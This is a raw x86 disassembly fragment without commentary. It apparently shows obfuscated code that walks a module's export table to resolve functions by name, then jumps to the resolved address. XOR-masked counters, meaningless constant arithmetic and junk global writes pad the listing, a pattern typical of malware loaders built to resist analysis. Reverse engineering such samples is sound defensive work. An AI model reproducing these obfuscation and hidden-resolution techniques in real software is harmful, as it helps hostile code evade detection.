  4212c6:	mov    edx,DWORD PTR [ebp-0xe8]
  4212cc:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4212d3:	add    ecx,eax
  4212d5:	add    esi,ecx
  4212d7:	mov    DWORD PTR [ebp-0x38],esi
  4212da:	mov    DWORD PTR [ebp-0x4],0x59a8
  4212e1:	mov    DWORD PTR [ebp-0x30],0x7021
  4212e8:	mov    DWORD PTR [ebp-0xf4],0x6210
  4212f2:	mov    DWORD PTR [ebp-0x58],0x73d5
  4212f9:	mov    DWORD PTR [ebp-0x124],0x1e7d
  421303:	mov    DWORD PTR [ebp-0x3c],0x3144
  42130a:	mov    eax,DWORD PTR [ebp-0x30]
  42130d:	xor    eax,0x75cb
  421312:	mov    ecx,DWORD PTR [ebp-0x4]
  421315:	imul   eax,ecx
  421318:	mov    ecx,DWORD PTR [ebp+0x8]
  42131b:	lea    ecx,[ecx+eax*1-0x2123b90]
  421322:	mov    eax,DWORD PTR [ebp-0xf4]
  421328:	and    eax,0x6b34
  42132d:	and    eax,0x658d
  421332:	xor    edx,edx
  421334:	push   0x6
  421336:	pop    esi
  421337:	div    esi
  421339:	imul   eax,eax,0x3fb9
  42133f:	mov    edx,DWORD PTR [ebp-0x3c]
  421342:	and    edx,0x58c7
  421348:	mov    esi,DWORD PTR [ebp-0x124]
  42134e:	or     edx,esi
  421350:	add    edx,0x7a25
  421356:	imul   edx,edx,0x28d2
  42135c:	mov    esi,DWORD PTR [ebp-0x58]
  42135f:	xor    edx,esi
  421361:	xor    edx,0x1856f731
  421367:	mov    esi,DWORD PTR [ebp-0xe8]
  42136d:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421374:	add    eax,ecx
  421376:	add    edx,eax
  421378:	mov    DWORD PTR [ebp-0xac],edx
  42137e:	mov    DWORD PTR [ebp-0x54],0x1
  421385:	mov    DWORD PTR [ebp-0x40],0x1ee8
  42138c:	mov    DWORD PTR [ebp-0x1c],0x64d8
  421393:	mov    DWORD PTR [ebp-0xf0],0x5a06
  42139d:	mov    DWORD PTR [ebp-0x108],0x2eeb
  4213a7:	mov    DWORD PTR [ebp-0x104],0x2108
  4213b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4213b4:	xor    edx,edx
  4213b6:	push   0x3
  4213b8:	pop    ecx
  4213b9:	div    ecx
  4213bb:	mov    ecx,DWORD PTR [ebp-0x40]
  4213be:	or     eax,ecx
  4213c0:	mov    ecx,DWORD PTR [ebp-0x54]
  4213c3:	xor    edx,edx
  4213c5:	div    ecx
  4213c7:	imul   eax,eax,0x7d53
  4213cd:	mov    ecx,DWORD PTR [ebp+0x8]
  4213d0:	lea    eax,[ecx+eax*1-0x1f534807]
  4213d7:	mov    ecx,DWORD PTR [ebp-0xf0]
  4213dd:	and    ecx,0x4108
  4213e3:	and    ecx,0x40e7
  4213e9:	sub    ecx,0x1a54
  4213ef:	xor    ecx,0x25ac
  4213f5:	mov    edx,DWORD PTR [ebp-0x104]
  4213fb:	xor    edx,0x6dda
  421401:	mov    esi,DWORD PTR [ebp-0x108]
  421407:	and    edx,esi
  421409:	and    edx,0xe0c
  42140f:	or     edx,0x5b
  421412:	mov    esi,DWORD PTR [ebp-0xe8]
  421418:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42141c:	add    ecx,eax
  42141e:	lea    eax,[edx+ecx*1-0xc5b]
  421425:	mov    DWORD PTR [ebp-0xa8],eax
  42142b:	and    DWORD PTR [ebp-0x144],0x0
  421432:	jmp    0x421444
  421437:	mov    eax,DWORD PTR [ebp-0x144]
  42143d:	inc    eax
  42143e:	mov    DWORD PTR [ebp-0x144],eax
  421444:	mov    eax,DWORD PTR [ebp-0xe8]
  42144a:	mov    ecx,DWORD PTR [ebp-0x144]
  421450:	cmp    ecx,DWORD PTR [eax+0x18]
  421453:	je     0x421a0c
  421459:	mov    eax,DWORD PTR [ebp-0x144]
  42145f:	mov    ecx,DWORD PTR [ebp-0x38]
  421462:	mov    edx,DWORD PTR [ebp+0x8]
  421465:	add    edx,DWORD PTR [ecx+eax*4]
  421468:	mov    DWORD PTR [ebp-0x48],edx
  42146b:	mov    eax,DWORD PTR [ebp-0x48]
  42146e:	mov    DWORD PTR [ebp-0x210],eax
  421474:	mov    eax,DWORD PTR [ebp+0xc]
  421477:	mov    DWORD PTR [ebp-0x20c],eax
  42147d:	mov    DWORD PTR [ebp-0x1f0],0xba699573
  421487:	mov    DWORD PTR [ebp-0x1ec],0x9c0a89d8
  421491:	mov    DWORD PTR [ebp-0x1e0],0xba699577
  42149b:	mov    DWORD PTR [ebp-0x1dc],0x9c0a89d8
  4214a5:	lea    eax,[ebp-0x1e8]
  4214ab:	mov    DWORD PTR [ebp-0x1f4],eax
  4214b1:	mov    eax,DWORD PTR [ebp-0x20c]
  4214b7:	movzx  eax,WORD PTR [eax+0x20]
  4214bb:	xor    eax,0xa38b
  4214c0:	movzx  eax,ax
  4214c3:	sar    eax,1
  4214c5:	mov    ecx,DWORD PTR [ebp-0x20c]
  4214cb:	movzx  ecx,WORD PTR [ecx+0x20]
  4214cf:	xor    ecx,0xa38b
  4214d5:	movzx  ecx,cx
  4214d8:	shl    ecx,0xf
  4214db:	or     eax,ecx
  4214dd:	movzx  eax,ax
  4214e0:	mov    ecx,DWORD PTR [ebp-0x1f4]
  4214e6:	mov    DWORD PTR [ecx],eax
  4214e8:	mov    eax,DWORD PTR [ebp-0x1e0]
  4214ee:	mov    edx,DWORD PTR [ebp-0x1dc]
  4214f4:	xor    eax,0xba699573
  4214f9:	xor    edx,0x9c0a89d8
  4214ff:	mov    cl,0x2
  421501:	call   0x41a184
  421506:	mov    ebx,eax
  421508:	mov    esi,edx
  42150a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421510:	mov    edx,DWORD PTR [ebp-0x1dc]
  421516:	xor    eax,0xba699573
  42151b:	xor    edx,0x9c0a89d8
  421521:	mov    cl,0x3e
  421523:	call   0x421c1c
  421528:	or     ebx,eax
  42152a:	or     esi,edx
  42152c:	movzx  eax,bl
  42152f:	push   eax
  421530:	lea    eax,[ebp-0x198]
  421536:	push   eax
  421537:	call   0x41e063
  42153c:	mov    eax,DWORD PTR [ebp-0x1f0]
  421542:	mov    edx,DWORD PTR [ebp-0x1ec]
  421548:	xor    eax,0xba699573
  42154d:	xor    edx,0x9c0a89d8
  421553:	mov    cl,0x2
  421555:	call   0x41a184
  42155a:	mov    esi,eax
  42155c:	mov    edi,edx
  42155e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421564:	mov    edx,DWORD PTR [ebp-0x1ec]
  42156a:	xor    eax,0xba699573
  42156f:	xor    edx,0x9c0a89d8
  421575:	mov    cl,0x3e
  421577:	call   0x421c1c
  42157c:	or     esi,eax
  42157e:	or     edi,edx
  421580:	mov    DWORD PTR [ebp-0x1f8],esi
  421586:	jmp    0x4215db
  42158b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421591:	mov    edx,DWORD PTR [ebp-0x1dc]
  421597:	xor    eax,0xba699573
  42159c:	xor    edx,0x9c0a89d8
  4215a2:	mov    cl,0x2
  4215a4:	call   0x41a184
  4215a9:	mov    esi,eax
  4215ab:	mov    edi,edx
  4215ad:	mov    eax,DWORD PTR [ebp-0x1e0]
  4215b3:	mov    edx,DWORD PTR [ebp-0x1dc]
  4215b9:	xor    eax,0xba699573
  4215be:	xor    edx,0x9c0a89d8
  4215c4:	mov    cl,0x3e
  4215c6:	call   0x421c1c
  4215cb:	or     esi,eax
  4215cd:	or     edi,edx
  4215cf:	add    esi,DWORD PTR [ebp-0x1f8]
  4215d5:	mov    DWORD PTR [ebp-0x1f8],esi
  4215db:	mov    eax,DWORD PTR [ebp-0x1e8]
  4215e1:	cmp    DWORD PTR [ebp-0x1f8],eax
  4215e7:	je     0x42167a
  4215ed:	mov    eax,DWORD PTR [ebp-0x1f8]
  4215f3:	mov    ecx,DWORD PTR [ebp-0x20c]
  4215f9:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  4215fe:	xor    eax,0xa38b
  421603:	movzx  eax,ax
  421606:	sar    eax,1
  421608:	mov    ecx,DWORD PTR [ebp-0x1f8]
  42160e:	mov    edx,DWORD PTR [ebp-0x20c]
  421614:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421619:	xor    ecx,0xa38b
  42161f:	movzx  ecx,cx
  421622:	shl    ecx,0xf
  421625:	or     eax,ecx
  421627:	movzx  eax,ax
  42162a:	mov    DWORD PTR [ebp-0x1fc],eax
  421630:	mov    eax,DWORD PTR [ebp-0x1f8]
  421636:	mov    ecx,DWORD PTR [ebp-0x20c]
  42163c:	movzx  eax,WORD PTR [ecx+eax*4]
  421640:	xor    eax,0xa38b
  421645:	movzx  eax,ax
  421648:	sar    eax,1
  42164a:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421650:	mov    edx,DWORD PTR [ebp-0x20c]
  421656:	movzx  ecx,WORD PTR [edx+ecx*4]
  42165a:	xor    ecx,0xa38b
  421660:	movzx  ecx,cx
  421663:	shl    ecx,0xf
  421666:	or     eax,ecx
  421668:	mov    ecx,DWORD PTR [ebp-0x1fc]
  42166e:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421675:	jmp    0x42158b
  42167a:	mov    eax,DWORD PTR [ebp-0x1f0]
  421680:	mov    edx,DWORD PTR [ebp-0x1ec]
  421686:	xor    eax,0xba699573
  42168b:	xor    edx,0x9c0a89d8
  421691:	mov    cl,0x2
  421693:	call   0x41a184
  421698:	mov    esi,eax
  42169a:	mov    edi,edx
  42169c:	mov    eax,DWORD PTR [ebp-0x1f0]
  4216a2:	mov    edx,DWORD PTR [ebp-0x1ec]
  4216a8:	xor    eax,0xba699573
  4216ad:	xor    edx,0x9c0a89d8
  4216b3:	mov    cl,0x3e
  4216b5:	call   0x421c1c
  4216ba:	or     esi,eax
  4216bc:	or     edi,edx
  4216be:	mov    DWORD PTR [ebp-0x1e4],esi
  4216c4:	mov    eax,DWORD PTR [ebp-0x1e0]
  4216ca:	mov    edx,DWORD PTR [ebp-0x1dc]
  4216d0:	xor    eax,0xba699573
  4216d5:	xor    edx,0x9c0a89d8
  4216db:	mov    cl,0x2
  4216dd:	call   0x41a184
  4216e2:	mov    esi,eax
  4216e4:	mov    edi,edx
  4216e6:	mov    eax,DWORD PTR [ebp-0x1e0]
  4216ec:	mov    edx,DWORD PTR [ebp-0x1dc]
  4216f2:	xor    eax,0xba699573
  4216f7:	xor    edx,0x9c0a89d8
  4216fd:	mov    cl,0x3e
  4216ff:	call   0x421c1c
  421704:	or     esi,eax
  421706:	or     edi,edx
  421708:	mov    DWORD PTR [ebp-0x23c],esi
  42170e:	mov    DWORD PTR [ebp-0x238],edi
  421714:	mov    eax,DWORD PTR [ebp-0x23c]
  42171a:	or     eax,DWORD PTR [ebp-0x238]
  421720:	je     0x421980
  421726:	lea    eax,[ebp-0x204]
  42172c:	mov    DWORD PTR [ebp-0x208],eax
  421732:	mov    eax,DWORD PTR [ebp-0x1e4]
  421738:	xor    edx,edx
  42173a:	mov    cl,0x2
  42173c:	call   0x421c1c
  421741:	mov    esi,eax
  421743:	mov    edi,edx
  421745:	mov    eax,DWORD PTR [ebp-0x1e4]
  42174b:	xor    edx,edx
  42174d:	mov    cl,0x3e
  42174f:	call   0x41a184
  421754:	or     esi,eax
  421756:	or     edi,edx
  421758:	xor    esi,0xba699573
  42175e:	xor    edi,0x9c0a89d8
  421764:	mov    eax,DWORD PTR [ebp-0x208]
  42176a:	mov    DWORD PTR [eax],esi
  42176c:	mov    DWORD PTR [eax+0x4],edi
  42176f:	mov    eax,DWORD PTR [ebp-0x1e4]
  421775:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  42177d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421783:	mov    edx,DWORD PTR [ebp-0x1dc]
  421789:	xor    eax,0xba699573
  42178e:	xor    edx,0x9c0a89d8
  421794:	mov    cl,0x2
  421796:	call   0x41a184
  42179b:	mov    ebx,eax
  42179d:	mov    edi,edx
  42179f:	mov    eax,DWORD PTR [ebp-0x1e0]
  4217a5:	mov    edx,DWORD PTR [ebp-0x1dc]
  4217ab:	xor    eax,0xba699573
  4217b0:	xor    edx,0x9c0a89d8
  4217b6:	mov    cl,0x3e
  4217b8:	call   0x421c1c
  4217bd:	or     ebx,eax
  4217bf:	or     edi,edx
  4217c1:	movsx  eax,bl
  4217c4:	cmp    esi,eax
  4217c6:	je     0x421926
  4217cc:	mov    eax,DWORD PTR [ebp-0x1e4]
  4217d2:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  4217da:	mov    eax,DWORD PTR [ebp-0x204]
  4217e0:	mov    edx,DWORD PTR [ebp-0x200]
  4217e6:	xor    eax,0xba699573
  4217eb:	xor    edx,0x9c0a89d8
  4217f1:	mov    cl,0x2
  4217f3:	call   0x41a184
  4217f8:	mov    edi,eax
  4217fa:	mov    ebx,edx
  4217fc:	mov    eax,DWORD PTR [ebp-0x204]
  421802:	mov    edx,DWORD PTR [ebp-0x200]
  421808:	xor    eax,0xba699573
  42180d:	xor    edx,0x9c0a89d8
  421813:	mov    cl,0x3e
  421815:	call   0x421c1c
  42181a:	or     edi,eax
  42181c:	or     ebx,edx
  42181e:	mov    eax,DWORD PTR [ebp-0x210]
  421824:	movsx  eax,BYTE PTR [eax+edi*1]
  421828:	cmp    esi,eax
  42182a:	je     0x42183a
  421830:	jmp    0x421980
  421835:	jmp    0x421926
  42183a:	mov    eax,DWORD PTR [ebp-0x204]
  421840:	mov    edx,DWORD PTR [ebp-0x200]
  421846:	xor    eax,0xba699573
  42184b:	xor    edx,0x9c0a89d8
  421851:	mov    cl,0x2
  421853:	call   0x41a184
  421858:	mov    esi,eax
  42185a:	mov    edi,edx
  42185c:	mov    eax,DWORD PTR [ebp-0x204]
  421862:	mov    edx,DWORD PTR [ebp-0x200]
  421868:	xor    eax,0xba699573
  42186d:	xor    edx,0x9c0a89d8
  421873:	mov    cl,0x3e
  421875:	call   0x421c1c
  42187a:	or     esi,eax
  42187c:	or     edi,edx
  42187e:	mov    eax,DWORD PTR [ebp-0x210]
  421884:	movsx  esi,BYTE PTR [eax+esi*1]
  421888:	mov    eax,DWORD PTR [ebp-0x1f0]
  42188e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421894:	xor    eax,0xba699573
  421899:	xor    edx,0x9c0a89d8
  42189f:	mov    cl,0x2
  4218a1:	call   0x41a184
  4218a6:	mov    ebx,eax
  4218a8:	mov    edi,edx
  4218aa:	mov    eax,DWORD PTR [ebp-0x1f0]
  4218b0:	mov    edx,DWORD PTR [ebp-0x1ec]
  4218b6:	xor    eax,0xba699573
  4218bb:	xor    edx,0x9c0a89d8
  4218c1:	mov    cl,0x3e
  4218c3:	call   0x421c1c
  4218c8:	or     ebx,eax
  4218ca:	or     edi,edx
  4218cc:	movsx  eax,bl
  4218cf:	cmp    esi,eax
  4218d1:	jne    0x421926
  4218d7:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218dd:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218e3:	xor    eax,0xba699573
  4218e8:	xor    edx,0x9c0a89d8
  4218ee:	mov    cl,0x2
  4218f0:	call   0x41a184
  4218f5:	mov    esi,eax
  4218f7:	mov    edi,edx
  4218f9:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218ff:	mov    edx,DWORD PTR [ebp-0x1dc]
  421905:	xor    eax,0xba699573
  42190a:	xor    edx,0x9c0a89d8
  421910:	mov    cl,0x3e
  421912:	call   0x421c1c
  421917:	or     esi,eax
  421919:	or     edi,edx
  42191b:	mov    DWORD PTR [ebp-0x214],esi
  421921:	jmp    0x4219ca
  421926:	mov    eax,DWORD PTR [ebp-0x1e0]
  42192c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421932:	xor    eax,0xba699573
  421937:	xor    edx,0x9c0a89d8
  42193d:	mov    cl,0x2
  42193f:	call   0x41a184
  421944:	mov    esi,eax
  421946:	mov    edi,edx
  421948:	mov    eax,DWORD PTR [ebp-0x1e0]
  42194e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421954:	xor    eax,0xba699573
  421959:	xor    edx,0x9c0a89d8
  42195f:	mov    cl,0x3e
  421961:	call   0x421c1c
  421966:	or     esi,eax
  421968:	or     edi,edx
  42196a:	add    esi,DWORD PTR [ebp-0x1e4]
  421970:	mov    DWORD PTR [ebp-0x1e4],esi
  421976:	jmp    0x4216c4
  42197b:	jmp    0x4216c4
  421980:	mov    eax,DWORD PTR [ebp-0x1f0]
  421986:	mov    edx,DWORD PTR [ebp-0x1ec]
  42198c:	xor    eax,0xba699573
  421991:	xor    edx,0x9c0a89d8
  421997:	mov    cl,0x2
  421999:	call   0x41a184
  42199e:	mov    esi,eax
  4219a0:	mov    edi,edx
  4219a2:	mov    eax,DWORD PTR [ebp-0x1f0]
  4219a8:	mov    edx,DWORD PTR [ebp-0x1ec]
  4219ae:	xor    eax,0xba699573
  4219b3:	xor    edx,0x9c0a89d8
  4219b9:	mov    cl,0x3e
  4219bb:	call   0x421c1c
  4219c0:	or     esi,eax
  4219c2:	or     edi,edx
  4219c4:	mov    DWORD PTR [ebp-0x214],esi
  4219ca:	mov    eax,DWORD PTR [ebp-0x214]
  4219d0:	mov    DWORD PTR [ebp-0xc8],eax
  4219d6:	cmp    DWORD PTR [ebp-0xc8],0x0
  4219dd:	je     0x421a07
  4219e3:	mov    eax,DWORD PTR [ebp-0x144]
  4219e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4219ef:	movzx  eax,WORD PTR [ecx+eax*2]
  4219f3:	mov    ecx,DWORD PTR [ebp-0xa8]
  4219f9:	mov    eax,DWORD PTR [ecx+eax*4]
  4219fc:	mov    DWORD PTR [ebp-0xfc],eax
  421a02:	jmp    0x421a0c
  421a07:	jmp    0x421437
  421a0c:	cmp    DWORD PTR [ebp-0xfc],0x0
  421a13:	jne    0x421a20
  421a19:	xor    eax,eax
  421a1b:	jmp    0x421c15
  421a20:	mov    eax,DWORD PTR [ebp+0x8]
  421a23:	add    eax,DWORD PTR [ebp-0xfc]
  421a29:	mov    DWORD PTR [ebp-0xec],eax
  421a2f:	mov    DWORD PTR [ebp-0x74],0x0
  421a36:	cmp    DWORD PTR [ebp-0xb0],0x0
  421a3d:	je     0x421ab9
  421a43:	cmp    DWORD PTR [ebp-0xb0],0x0
  421a4a:	je     0x421ab9
  421a50:	mov    eax,DWORD PTR [ebp-0xb0]
  421a56:	shl    eax,0x2
  421a59:	mov    DWORD PTR [ebp-0x74],eax
  421a5c:	mov    DWORD PTR [ebp-0x14c],0x0
  421a66:	sub    esp,DWORD PTR [ebp-0x74]
  421a69:	mov    DWORD PTR [ebp-0x14c],esp
  421a6f:	mov    DWORD PTR [ebp-0x148],0x0
  421a79:	mov    eax,DWORD PTR [ebp-0x148]
  421a7f:	cmp    eax,DWORD PTR [ebp-0xb0]
  421a85:	je     0x421ab9
  421a8b:	mov    eax,DWORD PTR [ebp-0x148]
  421a91:	mov    ecx,DWORD PTR [ebp-0x14c]
  421a97:	mov    edx,DWORD PTR [ebp-0x148]
  421a9d:	mov    esi,DWORD PTR [ebp+0x14]
  421aa0:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421aa4:	mov    DWORD PTR [ecx+eax*4],edx
  421aa7:	mov    eax,DWORD PTR [ebp-0x148]
  421aad:	inc    eax
  421aae:	mov    DWORD PTR [ebp-0x148],eax
  421ab4:	jmp    0x421a79
  421ab9:	mov    DWORD PTR [ebp-0x9c],0x0
  421ac3:	push   0x421bdc
  421ac8:	jmp    DWORD PTR [ebp-0xec]
  421ace:	mov    eax,eax
  421ad0:	mov    ecx,esp
  421ad2:	ret    0x4
  421ad5:	sub    DWORD PTR ds:0x422972,ecx
  421adb:	push   ebx
  421adc:	mov    eax,ds:0x422a36
  421ae1:	mov    eax,DWORD PTR [eax]
  421ae3:	add    DWORD PTR ds:0x4228be,eax
  421ae9:	push   esi
  421aea:	inc    eax
  421aeb:	mov    eax,DWORD PTR [esp+0x18]
  421aef:	or     eax,eax
  421af1:	mov    DWORD PTR ds:0x422976,0x30f6
  421afb:	jne    0x421b4c
  421b01:	mov    ecx,DWORD PTR [esp+0x14]
  421b05:	xor    DWORD PTR ds:0x4228f6,0x4645
  421b0f:	mov    eax,DWORD PTR [esp+0x10]
  421b13:	mov    ebx,DWORD PTR ds:0x422992
  421b19:	add    ebx,DWORD PTR ds:0x42299e
  421b1f:	mov    DWORD PTR ds:0x422992,ebx
  421b25:	xor    edx,edx
  421b27:	adc    DWORD PTR ds:0x422972,0x7727
  421b31:	div    ecx
  421b33:	mov    ebx,eax
  421b35:	mov    eax,DWORD PTR [esp+0xc]
  421b39:	mov    DWORD PTR ds:0x4228aa,0xac4
  421b43:	div    ecx
  421b45:	mov    edx,ebx
  421b47:	jmp    0x421bd7
  421b4c:	mov    ecx,eax
  421b4e:	movzx  eax,WORD PTR ds:0x4228ca
  421b55:	or     eax,DWORD PTR ds:0x4229b2
  421b5b:	mov    ds:0x4228ca,eax
  421b60:	mov    ebx,DWORD PTR [esp+0x14]
  421b64:	adc    DWORD PTR ds:0x422922,ecx
  421b6a:	mov    edx,DWORD PTR [esp+0x10]
  421b6e:	mov    eax,DWORD PTR [esp+0xc]
  421b72:	sbb    DWORD PTR ds:0x42299a,0x1a98
  421b7c:	shr    ecx,1
  421b7e:	mov    DWORD PTR ds:0x42289e,0x38b9
  421b88:	rcr    ebx,1
  421b8a:	or     DWORD PTR ds:0x42296e,0x13a0
  421b94:	shr    edx,1
  421b96:	rcr    eax,1
  421b98:	or     ecx,ecx
  421b9a:	jne    0x421b72
  421ba0:	div    ebx
  421ba2:	mov    esi,eax
  421ba4:	mul    DWORD PTR [esp+0x18]
  421ba8:	mov    ecx,eax
  421baa:	mov    eax,DWORD PTR [esp+0x14]
  421bae:	mul    esi
  421bb0:	add    edx,ecx
  421bb2:	jb     0x421bd2
  421bb8:	cmp    edx,DWORD PTR [esp+0x10]
  421bbc:	ja     0x421bd2
  421bc2:	jb     0x421bd3
  421bc8:	cmp    eax,DWORD PTR [esp+0xc]
  421bcc:	jbe    0x421bd3
  421bd2:	dec    esi
  421bd3:	xor    edx,edx
  421bd5:	mov    eax,esi
  421bd7:	pop    esi
  421bd8:	pop    ebx
  421bd9:	ret    0x10
  421bdc:	sub    DWORD PTR [ebp+0x10],0x1
  421be0:	mov    DWORD PTR ds:0x4228ce,0x220d
  421bea:	cmp    DWORD PTR [ebp+0x10],0x0
  421bee:	je     0x421bfd
  421bf4:	and    edi,DWORD PTR ds:0x4229ca
  421bfa:	add    esp,DWORD PTR [ebp-0x74]
  421bfd:	mov    edi,DWORD PTR ds:0x422896
  421c03:	mov    DWORD PTR [ebp-0x9c],eax
  421c09:	mov    eax,DWORD PTR [ebp-0x9c]
  421c0f:	mov    DWORD PTR ds:0x4228ee,edx
  421c15:	pop    edi
  421c16:	pop    esi
  421c17:	pop    ebx
  421c18:	leave  
  421c19:	ret    0x10
  421c1c:	mov    DWORD PTR ds:0x42298e,0x1d18
  421c26:	cmp    cl,0x40
  421c29:	jae    0x421c70
  421c2f:	cmp    cl,0x20
  421c32:	mov    DWORD PTR ds:0x4228d6,0x5a1c
  421c3c:	jae    0x421c48
  421c42:	shld   edx,eax,cl
  421c45:	shl    eax,cl
  421c47:	ret    
  421c48:	and    DWORD PTR ds:0x42293e,0x7607
  421c52:	mov    edx,eax
  421c54:	sub    DWORD PTR ds:0x4228fa,0x422952
  421c5e:	xor    eax,eax
  421c60:	and    cl,0x1f
  421c63:	mov    DWORD PTR ds:0x42295e,0x73ce
  421c6d:	shl    edx,cl
  421c6f:	ret    
  421c70:	xor    eax,eax
  421c72:	xor    edx,edx
  421c74:	ret    
